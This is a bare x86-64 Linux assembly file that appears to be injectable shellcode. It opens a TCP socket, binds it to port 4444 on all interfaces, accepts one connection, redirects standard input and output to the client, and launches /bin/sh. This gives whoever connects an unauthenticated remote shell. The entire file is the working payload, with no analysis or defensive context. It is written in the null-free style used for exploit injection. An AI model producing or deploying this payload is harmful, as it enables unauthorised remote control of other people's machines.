BITS 64

_start:
    ; socket(AF_INET, SOCK_STREAM, 0)
    xor     rax, rax
    mov     al, 41
    xor     rdi, rdi
    mov     dil, 2
    xor     rsi, rsi
    mov     sil, 1
    xor     rdx, rdx
    syscall
    mov     r12, rax

    ; bind(sockfd, {AF_INET, 4444, 0.0.0.0}, 16)
    xor     rax, rax
    push    rax
    mov     rax, 0x5C110002
    push    rax
    mov     rsi, rsp
    mov     rax, 49
    mov     rdi, r12
    mov     rdx, 16
    syscall

    ; listen(sockfd, 0)
    xor     rax, rax
    mov     al, 50
    mov     rdi, r12
    xor     rsi, rsi
    syscall

    ; accept(sockfd, NULL, NULL)
    xor     rax, rax
    mov     al, 43
    mov     rdi, r12
    xor     rsi, rsi
    xor     rdx, rdx
    syscall
    mov     r13, rax

    ; dup2(client_fd, 0/1/2)
    xor     rsi, rsi
dup_loop:
    xor     rax, rax
    mov     al, 33
    mov     rdi, r13
    syscall
    inc     rsi
    cmp     rsi, 3
    jne     dup_loop

    ; execve("/bin/sh", NULL, NULL)
    xor     rax, rax
    push    rax
    mov     rbx, 0x68732F6E69622F2F
    push    rbx
    mov     rdi, rsp
    xor     rsi, rsi
    xor     rdx, rdx
    mov     al, 59
    syscall
